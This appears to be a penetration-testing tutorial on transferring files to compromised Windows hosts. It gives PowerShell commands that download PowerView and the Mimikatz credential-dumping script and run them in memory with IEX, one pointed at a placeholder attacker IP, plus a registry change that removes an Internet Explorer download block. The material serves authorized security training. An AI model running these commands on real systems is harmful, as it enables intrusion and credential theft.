# File Transfer

There are many situations when transferring files either to or from a target system is necessary. We may successfully exploit a web application vulnerability, achieve RCE on a target web server, or even upload a web shell. There are many ways that we could upgrade our access to an interactive shell, and some require successfully transferring scripts, binaries, or tools to the target. During an internal assessment, we may find ourselves on a Windows host with a need to transfer over tools to perform enumeration of the Active Directory environment, to attempt privilege escalation, or have the need to download command output for offline processing.



## Windows File Transfer Methods

### PowerShell Downloads

```text
(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
```

From PowerShell 3.0, Invoke-WebRequest is also available, but it is noticeably slower at downloading files. The aliases `iwr`, `curl`, and `wget` can be used instead of Invoke-WebRequest.

```text
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

Instead of downloading to disk, the payload can instead be executed in memory, using Invoke-Expression, or the alias `iex`.

```text
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

IEX also accepts pipeline input.

```text
 Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex
```

There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download.  
This can be bypassed using the parameter `-UseBasicParsing`.

```text
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex
```

Alternatively, with administrative access to the machine, we can disable Internet Explorer’s First Run customization.

```text
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
```



